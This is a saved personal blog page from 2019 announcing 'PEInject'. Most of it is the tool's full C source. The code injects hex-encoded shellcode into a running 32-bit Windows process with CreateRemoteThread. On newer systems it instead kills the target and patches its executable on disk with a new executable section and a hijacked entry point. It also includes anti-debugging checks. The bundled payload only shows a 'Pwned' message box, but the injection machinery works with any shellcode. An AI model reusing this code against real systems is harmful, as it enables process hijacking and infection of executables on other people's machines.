@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <title>32-bit PE injector</title>
+
+    <meta name="apple-mobile-web-app-title" content="32-bit PE injector">
+
+    <link rel="apple-touch-icon" sizes="180x180" href="../assets/img/apple-touch-icon.png@v=deb4239dad">
+    <link rel="icon" type="image/png" sizes="32x32" href="../assets/img/favicon-32x32.png@v=deb4239dad">
+    <link rel="icon" type="image/png" sizes="16x16" href="../assets/img/favicon-16x16.png@v=deb4239dad">
+    <link rel="shortcut icon" href="../favicon.ico">
+
+    <link rel="stylesheet" href="http://fonts.googleapis.com/css?subset=latin,cyrillic-ext,latin-ext,cyrillic&amp;family=Open+Sans+Condensed:300|Merriweather:400,300,300italic,400italic,700,700italic|Roboto+Slab:400,300">
+    <link rel="stylesheet" href="http://cdnjs.cloudflare.com/ajax/libs/normalize/7.0.0/normalize.min.css">
+
+    <style type="text/css">
+    a, a:visited {color: #33cc99;}
+    .pagination a {color: #33cc99;}
+    .gist .gist-file .gist-meta a:visited {color: #33cc99 !important;}
+
+    a:focus, a:hover {color: #178b6b;}
+    h1.post-title a:focus, h1.post-title a:hover, h1.blog-title a:focus, h1.blog-title a:hover {color: #178b6b;}
+    .older-posts:hover, .newer-posts:hover {color: #178b6b;}
+</style>
+
+    <link rel="stylesheet" href="http://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="http://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/styles/github.min.css">
+    <link rel="stylesheet" href="../assets/css/steam.css@v=deb4239dad.css">
+
+
+    
+    <link rel="shortcut icon" href="../favicon.ico" type="image/x-icon" />
+    <link rel="canonical" href="index.html" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="amp/index.html" />
+    
+    <meta property="og:site_name" content="Mohamed Ali Mrabet " />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="32-bit PE injector" />
+    <meta property="og:description" content="I am releasing my new tool PEInject, It does inject some shellcodes into a desired process . Currently , it does only work with 32-bit executables , please don&#x27;t expect it to work flawlessly on all targets. It may fail if the target is loaded with /DYNAMICBASE module or DEP is permanently active" />
+    <meta property="og:url" content="http://localhost:2368/32-bit-pe-injector/" />
+    <meta property="article:published_time" content="2019-08-01T14:05:53.000Z" />
+    <meta property="article:modified_time" content="2019-08-01T14:09:02.000Z" />
+    <meta property="article:publisher" content="https://www.facebook.com/dali.mrabet.3" />
+    <meta property="article:author" content="https://www.facebook.com/dali.mrabet.3" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="32-bit PE injector" />
+    <meta name="twitter:description" content="I am releasing my new tool PEInject, It does inject some shellcodes into a desired process . Currently , it does only work with 32-bit executables , please don&#x27;t expect it to work flawlessly on all targets. It may fail if the target is loaded with /DYNAMICBASE module or DEP is permanently active" />
+    <meta name="twitter:url" content="http://localhost:2368/32-bit-pe-injector/" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="mohamed ali MRABET" />
+    <meta name="twitter:site" content="@Mrabet_Dali" />
+    <meta name="twitter:creator" content="@Mrabet_Dali" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Mohamed Ali Mrabet ",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "http://localhost:2368/favicon.ico",
+            "width": 60,
+            "height": 60
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "mohamed ali MRABET",
+        "url": "http://localhost:2368/author/mohamed/",
+        "sameAs": [
+            "https://www.facebook.com/dali.mrabet.3",
+            "https://twitter.com/Mrabet_Dali"
+        ]
+    },
+    "headline": "32-bit PE injector",
+    "url": "http://localhost:2368/32-bit-pe-injector/",
+    "datePublished": "2019-08-01T14:05:53.000Z",
+    "dateModified": "2019-08-01T14:09:02.000Z",
+    "description": "I am releasing my new tool PEInject, It does inject some shellcodes into a desired process . Currently , it does only work with 32-bit executables , please don&#x27;t expect it to work flawlessly on all targets. It may fail if the target is loaded with /DYNAMICBASE module or DEP is permanently active",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://localhost:2368/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 2.26" />
+    <link rel="alternate" type="application/rss+xml" title="Mohamed Ali Mrabet " href="../rss/index.html" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/themes/prism.min.css" />
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/plugins/line-numbers/prism-line-numbers.min.css" />
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/themes/prism-coy.min.css" />
+</head>
+<body class="post-template">
+
+    <header id="site-head">
+        <h1 class="blog-title"><a href="../index.html">Mohamed Ali Mrabet </a></h1>
+        <h1 class="blog-subtitle">Thoughts, stories and ideas.</h1>
+    </header>
+
+        <nav class="menu" role="nav">
+        <ul>
+                    <li class="nav-home"><a href="../index.html">Home</a></li>
+                    <li class="nav-github"><a href="https://github.com/dali-mrabet">github</a></li>
+        </ul>
+    </nav>
+
+
+    <main class="content" role="main">
+    <article class="post">
+        <header>
+        <h1 class="post-title">32-bit PE injector</h1>
+        <div class="post-meta"><time datetime="2019-08-01">01 August 2019</time></div>
+        </header>
+        <section class="post-content">
+            <!--kg-card-begin: html-->I am releasing my new tool PEInject, It does inject some shellcodes into a desired process . <br />Currently , it does only work with 32-bit executables , please don't expect it to work flawlessly on all targets. It may fail if the target is loaded with /DYNAMICBASE module or DEP is permanently active on it. <br /> On Windows XP it allocates enough room for the shellcode and executes it with 'CreateRemoteThread'. Because On Windows Vista/Win7/Win8.1 the'CreateRemoteThread' does not work smoothly due to some additional protection mechanisms ,so the injector creates an extra section named "L0phtTN" and loads it with a shellcode and then jumps back to the OEP .<!--kg-card-end: html--><!--kg-card-begin: html--><pre class="line-numbers"><code class="lang-c">
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <tlhelp32.h>
+#include <process.h>
+#include <WinBase.h>
+#include <imagehlp.h>
+
+
+// simple shellcode that displays msgBox  "Pwned by l0pht_TN" preceded by pushad and followed popad and jmp opcodes
+
+static  char  l0phtTN_shellcode[] =
+    "\x60\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"
+    "\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b"
+    "\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24"
+    "\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a"
+    "\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0"
+    "\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"
+    "\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a"
+    "\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2"
+    "\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f"
+    "\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52"
+    "\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
+    "\x32\x2e\x64\x68\x75\x73\x65\x72\x88\x5c\x24\x0a\x89\xe6\x56"
+    "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52"
+    "\xe8\x61\xff\xff\xff\x68\x64\x21\x21\x58\x68\x70\x77\x6e\x65"
+    "\x31\xdb\x88\x5c\x24\x07\x89\xe3\x68\x4e\x58\x20\x20\x68\x70"
+    "\x68\x74\x54\x68\x6f\x20\x4c\x30\x68\x74\x7a\x20\x74\x68\x47"
+    "\x72\x65\x65\x31\xc9\x88\x4c\x24\x11\x89\xe1\x31\xd2\x52\x53"
+    "\x51\x52\xff\xd0\x31\xc0\x50\x61\xe9";    // put \xff\x55\x08 before /0x61 / 0xe9 if you desire to exitprocess() and not return to the OEP
+
+/*
+the following func adds a section named "L0phtTN" to the desired target .
+if the executable(target) is packed , or ASLR and DEP are active on it
+then the process injection would fail !!
+*/
+BOOL AddL0phtTnSection(char * path )
+{
+    // load the target
+    HANDLE target =  CreateFile(path, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE  ,NULL,OPEN_EXISTING,NULL,NULL);
+    if(target ==  INVALID_HANDLE_VALUE )
+    {
+        perror("Error in CreateFile()");
+        ExitProcess(-1);
+
+    }
+    DWORD  target_size = 0 ;
+// get the executable's size
+    target_size =  GetFileSize(target,0);
+    if(target_size == 0)
+    {
+        perror("Error in GetFileSize()");
+        ExitProcess(-1);
+    }
+
+    IMAGE_DOS_HEADER IDH ;
+    unsigned int n = 0 ;
+    //read the DOS_header
+    if(!ReadFile(target,&IDH,sizeof(IMAGE_DOS_HEADER),&n,NULL))
+    {
+        perror("Error in ReadFile() (IMAGE_DOS_HEADER) ");
+        ExitProcess(-1);
+    }
+    // checks whether is is a valid executable
+    if(IDH.e_magic != IMAGE_DOS_SIGNATURE)
+    {
+        perror("invalid DOS signture");
+        ExitProcess(-1);
+    }
+
+    IMAGE_NT_HEADERS INH = {0};
+    //sets the file pointer to the begginning of the NT header using e_lfanew value (which in turn points to it)
+    SetFilePointer(target,IDH.e_lfanew,NULL,FILE_BEGIN);
+    //now reaad the NT_header
+    if(!ReadFile(target,&INH,sizeof(IMAGE_NT_HEADERS),&n,NULL))
+    {
+        perror("Error in ReadFile() (IMAGE_NT_HEADERS)");
+        ExitProcess(-1);
+    }
+    //checks its signature  (0x4550 if is valid )
+    if(INH.Signature != IMAGE_NT_SIGNATURE)
+    {
+        perror("invalid NT signature ");
+        ExitProcess(-1);
+    }
+    //read the number of sections
+    DWORD  Number_Sections = INH.FileHeader.NumberOfSections ;
+    //now points to the last section
+    SetFilePointer(target,IDH.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * (Number_Sections -1 ) ) ,NULL,FILE_BEGIN);
+    IMAGE_SECTION_HEADER last_section = {0};
+    //get the last section
+    ReadFile(target,&last_section,sizeof(IMAGE_SECTION_HEADER),&n,NULL) ;
+    //allocate enough space to store the whole executable
+    BYTE * myfile = (BYTE *)malloc(sizeof(BYTE) * target_size);
+    Sleep(500) ;
+    //points to the beggining of the target
+    SetFilePointer(target,0,NULL,FILE_BEGIN);
+    //store the whole target in myfile variable
+    ReadFile(target,myfile,target_size,&n,NULL);
+    Sleep(500);
+    // ISH is pointer to the end of the last section
+    PIMAGE_SECTION_HEADER ISH =  ( PIMAGE_SECTION_HEADER )(myfile + IDH.e_lfanew+sizeof(IMAGE_NT_HEADERS)+(sizeof(IMAGE_SECTION_HEADER) * Number_Sections) );
+    // PINH points to the NT_Header
+    PIMAGE_NT_HEADERS PINH = ( PIMAGE_NT_HEADERS )(myfile + IDH.e_lfanew );
+    // put the new section's name ...replace it with your desired section's name
+    strncpy(ISH->Name,"L0phtTN",8);
+    // sets the Characteristics of the new section to (read , write , execute ) and initialized just in case for relocation stufff
+    ISH->Characteristics = ( IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE );
+    // align the value of SizeOfRawData based FileAlignment value of the target
+    ISH->SizeOfRawData = (0X1000 % INH.OptionalHeader.FileAlignment == 0 )? 0X1000 :((0X1000/INH.OptionalHeader.FileAlignment+1) * INH.OptionalHeader.FileAlignment )  ;
+    // align the beggining of the new section when it on the HD
+    ISH->PointerToRawData = (last_section.SizeOfRawData % INH.OptionalHeader.FileAlignment == 0 )?(last_section.SizeOfRawData+last_section.PointerToRawData):(last_section.PointerToRawData + (last_section.SizeOfRawData/INH.OptionalHeader.FileAlignment+1)*INH.OptionalHeader.FileAlignment);
+    // align the size , when is loaded into the memory
+    ISH->Misc.VirtualSize = (0x1000 % INH.OptionalHeader.SectionAlignment == 0) ? 0x1000 :((0x1000/INH.OptionalHeader.SectionAlignment + 1) * INH.OptionalHeader.SectionAlignment) ;
+    // align the VirtualAddress when loaded into the memory
+    ISH->VirtualAddress =(last_section.Misc.VirtualSize % INH.OptionalHeader.SectionAlignment == 0)?(last_section.Misc.VirtualSize + last_section.VirtualAddress):(last_section.VirtualAddress+ (last_section.Misc.VirtualSize/INH.OptionalHeader.SectionAlignment +1)*INH.OptionalHeader.SectionAlignment);
+    // increments the NumberOfSections' value
+    PINH->FileHeader.NumberOfSections++;
+    // SizeOfImage's value must be increased by section's VirtualSize value
+    PINH->OptionalHeader.SizeOfImage = ISH->VirtualAddress + ISH->Misc.VirtualSize ;
+
+    SetFilePointer(target,ISH->SizeOfRawData +ISH->PointerToRawData,NULL,FILE_BEGIN);
+    SetEndOfFile(target) ;
+    SetFilePointer(target,0,NULL,FILE_BEGIN);
+    if( !WriteFile(target,myfile,target_size,&n,NULL) || n != target_size )
+    {
+        perror("could not write into the executable ");
+        return FALSE;
+    }
+    CloseHandle(target);
+    // the function which is responsible for shellcode injection
+    puts("New section Added ");
+    InjectShellcode(path,ISH->VirtualAddress,ISH->PointerToRawData,l0phtTN_shellcode,sizeof(l0phtTN_shellcode)+30);
+    Sleep(500) ;
+    return TRUE ;
+}
+
+
+BOOL CheckProcess(DWORD pid )
+{
+    PROCESSENTRY32 current_process ;
+    HANDLE proc_list ;
+    //
+    // DWORD priority ;
+
+    proc_list = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0) ;
+    if( proc_list == INVALID_HANDLE_VALUE )
+    {
+
+       return FALSE ;
+    }
+
+    current_process.dwSize = sizeof(PROCESSENTRY32);
+
+    if(!Process32First(proc_list,&current_process))
+    {
+
+        perror("error in Process32First \n");
+        return FALSE ;
+    }
+
+    while(1)
+    {
+        if((DWORD)pid == current_process.th32ProcessID )
+        {
+
+            return  TRUE ;
+        }
+
+        if(!Process32Next(proc_list,&current_process))
+            break ;
+    }
+
+    CloseHandle(proc_list) ;
+    return FALSE ;
+}
+/*
+according to MSDN : "The debug privilege allows someone to debug a process that they wouldn’t otherwise have access to.
+For example, a process running as a user with the debug privilege enabled on its token can debug a service running as local system."
+for more information :
+ http://msdn.microsoft.com/en-us/library/windows/hardware/ff541528(v=vs.85).aspx
+*/
+BOOL GetDebugPrivileges(void)
+{
+    HANDLE token;
+    TOKEN_PRIVILEGES priv;
+    BOOL ret = FALSE;
+
+    if (OpenProcessToken(GetCurrentProcessId(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY , &token))
+    {
+        priv.PrivilegeCount = 1;
+        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid) != FALSE && AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE)
+        {
+            ret = TRUE;
+        }
+        CloseHandle(token);
+    }
+    return ret;
+}
+static DWORD Target_Base_addr  = 0;
+
+char * GetTargetPath(DWORD pid)
+{
+    MODULEENTRY32 current;
+
+    HANDLE snapshot;
+
+    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,pid);
+    if (snapshot == INVALID_HANDLE_VALUE)
+    {
+        fprintf(stderr,"error in CreateToolhelp32Snapshot");
+        ExitProcess(-1) ;
+    }
+
+    current.dwSize = sizeof(MODULEENTRY32);
+    if(!Module32First(snapshot,&current))
+    {
+        fprintf(stderr,"error in Module32First");
+        ExitProcess(-1) ;
+    }
+    while(1)
+    {
+        if(current.th32ProcessID == pid)
+        {
+            char * mpath = (char *)malloc(sizeof(char) * strlen(current.szExePath)+1);
+            // printf("%s",current.szExePath);
+            *(mpath + strlen(current.szExePath)) = '\0' ;
+            //copy the path of executable
+            memcpy(mpath,&current.szExePath,sizeof(char) * strlen(current.szExePath));
+            //get the baseadress of the target
+            Target_Base_addr = current.modBaseAddr ;
+            return mpath;
+        }
+
+        if(!Module32Next(snapshot,&current))
+            break ;
+
+    }
+    CloseHandle(snapshot) ;
+    return NULL ;
+}
+
+BOOL InjectShellcode(char * path, DWORD new_entrypoint , DWORD RVA , char * sc, unsigned int shell_size)
+{
+
+
+    HANDLE Inject_Me = CreateFile(path, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE , NULL , OPEN_EXISTING ,NULL,NULL);
+    if(Inject_Me == INVALID_HANDLE_VALUE )
+    {
+        fprintf(stderr ,"error while injecting the shellcode !");
+        ExitProcess(-1) ;
+    }
+    IMAGE_DOS_HEADER IDH = {0} ;
+    IMAGE_NT_HEADERS INH = {0} ;
+    //where the return adress must be stored
+    int ret = 0;
+    int a ;
+    char cret[30];
+    memset(cret,(int)'\0',30);
+    if( !ReadFile(Inject_Me,&IDH,sizeof(IMAGE_DOS_HEADER),&a,FILE_BEGIN))
+    {
+        perror("readfile() error 1");
+        exit(-1) ;
+    }
+    char jmp_to_entrypoint[sizeof(l0phtTN_shellcode) + 30];
+    memset(jmp_to_entrypoint,(int)'\0',sizeof(l0phtTN_shellcode) + 30);
+// points to the beggining of NT_section
+    SetFilePointer(Inject_Me,IDH.e_lfanew , NULL , FILE_BEGIN);
+    /// puts the content of the NT-section into INH struct
+    ReadFile(Inject_Me,&INH,sizeof(IMAGE_NT_HEADERS),&a,FILE_BEGIN);
+    printf("\n  Original EntryPoint :%X \n ",INH.OptionalHeader.AddressOfEntryPoint);
+    ret = INH.OptionalHeader.AddressOfEntryPoint  + INH.OptionalHeader.ImageBase ;
+    // Because the jmp instruction encodes the next 5 opcodes like (the following : OEP - current adress ) - 5
+    //
+    ret =  (INH.OptionalHeader.AddressOfEntryPoint - (new_entrypoint + strlen(l0phtTN_shellcode) - 1 ) - 5 ) ;  // just to calculate the return address
+    // fill cret array with return adress in little endian format  !!
+    sprintf(cret," Return Adress : %0.2x%0.2x%0.2x%0.2x",( (ret << 16 )&0x00ff0000) >> 16 ,((ret << 8 )&0x00ff0000 ) >> 16 ,(ret >> 16 )&0x000000ff ,(ret >> 24 )& 0x000000ff );
+    // puts(cret);
+    //
+    memcpy(jmp_to_entrypoint,l0phtTN_shellcode,strlen(l0phtTN_shellcode));
+    // change the entry point of the target to virtual address of the L0phtTn section
+    INH.OptionalHeader.AddressOfEntryPoint = new_entrypoint ;
+    // replace the modified nt_section
+    SetFilePointer(Inject_Me,IDH.e_lfanew,NULL,FILE_BEGIN);
+    // replace the modified nt_section
+    WriteFile(Inject_Me,&INH,sizeof(IMAGE_NT_HEADERS),&a,FILE_BEGIN);
+    unsigned int isread = 0 ;
+
+    SetFilePointer(Inject_Me,RVA,NULL,FILE_BEGIN);
+
+    if(!WriteFile(Inject_Me,&jmp_to_entrypoint,shell_size,&isread,NULL) || isread != shell_size )
+    {
+        perror("cannot inject (WriteFile)");
+        ExitProcess(-1) ;
+    }
+    // sets the file pointer to end of the shellcode
+    SetFilePointer(Inject_Me,RVA+strlen(l0phtTN_shellcode)  ,NULL,FILE_BEGIN) ;
+    //and append it with the new return address
+    WriteFile(Inject_Me,&ret,sizeof(long long),&isread,NULL);
+    return TRUE ;
+}
+int Is_It_Debugged = 0 ;
+int main(int argc, char **argv)
+{
+
+    HANDLE my_exe ;
+    IMAGE_DOS_HEADER IDH;
+    DWORD pid = 0;
+    HANDLE target;
+
+    DWORD nbytes;
+    IMAGE_NT_HEADERS INH;
+    // get the TIB (thread information block )
+    asm("mov eax, dword ptr fs:[0x18]");
+    // get the PEB (process information block)
+    asm("mov eax, dword ptr ds:[eax+0x30]");
+    // get the beingDebugger flag
+    asm("movzx eax, byte ptr ds:[eax+0x2]");
+
+    asm("mov _Is_It_Debugged, eax");
+
+    if (Is_It_Debugged == 1)
+    {
+        ExitProcess(-1) ;
+    }
+     pid = atoi(argv[1]) ;
+    if( argc != 2 || pid  ==  0)
+    {
+        fprintf(stdout," \nUsage : %s <pid> \n",argv[0]);
+        exit(-1);
+    }
+
+    printf("%d\n",pid);
+   // Sleep(500);
+    // check if the target is running
+    if(CheckProcess(pid) == FALSE)
+    {
+        fprintf(stderr," \n %d not found on the list \n",pid);
+        ExitProcess(-1) ;
+    }
+    printf("passed");
+    // get path of the target (executable )
+    char * pathh =  GetTargetPath(pid);
+    //just in case when the anti-debug is bypassed ,the debugger is still get fooled by the anti-tracing (int 2d )
+/*
+    if(Is_It_Debugged == 1)
+    {
+        asm("pushad");
+        asm("int 0x2d");
+    }
+*/
+    // debug privileges are badly needed to get the processes running list without some issues
+    GetDebugPrivileges();
+    //checks if it is running under XP
+
+    if(((int)(GetVersion() & 0x000000ff)) == 5 )
+    {
+
+        if(Target_Base_addr == 0 )
+        {
+            fprintf(stderr," could not get the base adress of the process \n");
+            ExitProcess(-1) ;
+        }
+        printf("\n 0x%X \n",Target_Base_addr);
+        //open the target's process
+        if((my_exe = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid)) == INVALID_HANDLE_VALUE )
+        {
+            fprintf(stderr," process not found ");
+            ExitProcess(-1);
+        }
+        //read the DOS_header
+        if(!ReadProcessMemory(my_exe,Target_Base_addr,&IDH,sizeof(IMAGE_DOS_HEADER),&nbytes)  || nbytes !=  sizeof(IMAGE_DOS_HEADER) || IDH.e_magic != 0x5a4d )
+        {
+            fprintf(stderr,"\n error in ReadProcessMemory() \n");
+            ExitProcess(-1) ;
+        }
+        //read the NT_heaader
+        if(!ReadProcessMemory(my_exe,(Target_Base_addr+(DWORD)IDH.e_lfanew),&INH,sizeof(IMAGE_NT_HEADERS),&nbytes) || nbytes != sizeof(IMAGE_NT_HEADERS) || INH.Signature != IMAGE_NT_SIGNATURE)
+        {
+            fprintf(stderr,"\n error in reading the IMAGE_NT_HEADERS \n");
+            ExitProcess(-1) ;
+        }
+        LPVOID shell_addr = NULL ;
+        //check if there is enough room for the shellcode
+        shell_addr =  VirtualAllocEx(my_exe,0,sizeof(l0phtTN_shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE) ;
+        if(shell_addr == NULL )
+        {
+            fprintf(stderr,"something aint right with virtualallocEx");
+            ExitProcess(-1);
+        }
+        //store the L0phtTn shellcode
+        if(!WriteProcessMemory(my_exe,shell_addr,l0phtTN_shellcode,sizeof(l0phtTN_shellcode),&nbytes) && nbytes != sizeof(l0phtTN_shellcode) )
+        {
+            fprintf(stderr ,"cannot write into memory !");
+            ExitProcess(-1);
+        }
+
+        HANDLE r_handle ;
+        // trigger the shellcode
+        r_handle =  CreateRemoteThread(my_exe,NULL,0,(LPTHREAD_START_ROUTINE)shell_addr,0,0,0) ;
+        if(r_handle == INVALID_HANDLE_VALUE )
+        {
+            puts("cannot execute shellcode !!");
+            ExitProcess(-1);
+        }
+        exit(0) ;
+    }
+    else
+    {
+
+        char * tokill = (char * )malloc(sizeof(char) * 24);
+        //the target must be closed in order to add the new section !!
+        sprintf(tokill,"taskkill /F /IM %d",pid);
+        *(tokill + 23) = '\0' ;
+        system(tokill);
+        AddL0phtTnSection(pathh);
+        Sleep(500) ;
+
+    }
+    system("pause");
+    return 0 ;
+}
+</code></pre><!--kg-card-end: html-->
+        </section>
+        <section class="post-tags">
+            
+        </section>
+        <section class="share">
+            <p class="backtotop"><a data-scroll href="index.html#site-head"><i class="fa fa-lg fa-fw fa-angle-double-up"></i></a><a data-scroll class="backtotoptext" href="index.html#site-head"> Back to top</a></p>
+            <p class="info prompt">Share</p>
+            <a href="http://twitter.com/share?text=32-bit PE injector&url=http://localhost:2368/32-bit-pe-injector/" title="Share on Twitter"
+                onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fa fa-2x fa-fw fa-twitter-square"></i> <span class="hidden">Twitter</span>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:2368/32-bit-pe-injector/" title="Share on Facebook"
+                onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                <i class="fa fa-2x fa-fw fa-facebook-square" style="margin-left: -8px"></i> <span class="hidden">Facebook</span>
+            </a>
+            <a href="https://plus.google.com/share?url=http://localhost:2368/32-bit-pe-injector/" title="Share on Google+"
+               onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                <i class="fa fa-2x fa-fw fa-google-plus-square" style="margin-left: -8px"></i> <span class="hidden">Google+</span>
+            </a>
+        </section>
+        <footer class="post-footer">
+            <section class="author">
+        <div class="authorimage" style="background: url(../assets/img/default-avatar.png@v=deb4239dad)"></div>
+    <h4 class="author-name">mohamed ali MRABET</h4>
+    <p class="bio"></p>
+    <p class="meta">
+      
+      <i class="fa fa-fw fa-map-marker"></i> Montreal,Quebec
+    </p>
+</section>
+        </footer>
+
+    </article>
+</main>
+
+
+    <footer class="site-footer">
+        <div class="inner">
+            <section class="footer-social">
+        <a href="https://www.facebook.com/dali.mrabet.3" target="_blank" rel="noopener" title="Facebook"><i class="fa fa-2x fa-fw fa-facebook"></i> <span class="hidden">Facebook</span></a>
+        <a href="https://twitter.com/Mrabet_Dali" target="_blank" rel="noopener" title="Twitter"><i class="fa fa-2x fa-fw fa-twitter"></i> <span class="hidden">Twitter</span></a>
+    <a href="../rss/index.html" target="_blank" rel="noopener" title="RSS"><i class="fa fa-2x fa-fw fa-rss"></i> <span class="hidden">RSS</span></a>
+</section>
+            <section class="footer-author">A blog by <a href="mailto:author@example.com">Author Name</a></section>
+            <section class="copyright">&copy; 2019 <a href="../index.html">Mohamed Ali Mrabet </a>. All rights reserved</section>
+            <section class="theme"><a href="https://github.com/epistrephein/Steam" target="_blank" rel="noopener">Steam theme</a> by Tommaso Barbato</section>
+        </div>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/components/prism-csharp.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/components/prism-css.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.14.0/components/prism-clike.min.js"></script>
+<!-- Add additional languages here -->
+
+    <script src="http://cdnjs.cloudflare.com/ajax/libs/smooth-scroll/9.4.3/js/smooth-scroll.min.js"></script>
+    <script src="http://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/highlight.min.js"></script>
+    <script src="../assets/js/steam.js@v=deb4239dad"></script>
+</body>
+</html>
